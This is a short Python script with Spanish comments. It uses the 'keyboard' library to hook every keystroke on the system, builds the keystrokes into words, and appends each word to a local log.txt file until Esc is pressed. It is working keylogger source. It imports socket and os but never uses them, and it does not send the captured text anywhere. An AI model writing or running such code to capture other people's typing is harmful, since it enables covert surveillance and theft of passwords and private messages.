#Librerias 
import keyboard
import sys
import socket
import os

#Variables
word = ""
def pulso_key(pulso):
    global word 

    if pulso.event_type == keyboard.KEY_DOWN:
        if pulso.name == "space":
            save_word()
        elif len(pulso.name) == 1 and pulso.name.isprintable():
           word += pulso.name

keyboard.hook(pulso_key)

def save_word():
    with open("log.txt", "a") as file:
        file.write(word + "\n")
    print("Palabra guardada:", word)
    reset_word()

def reset_word():
    global word
    word = ""

try:
    keyboard.wait("esc")
except KeyboardInterrupt:
    print("Programa terminado...")


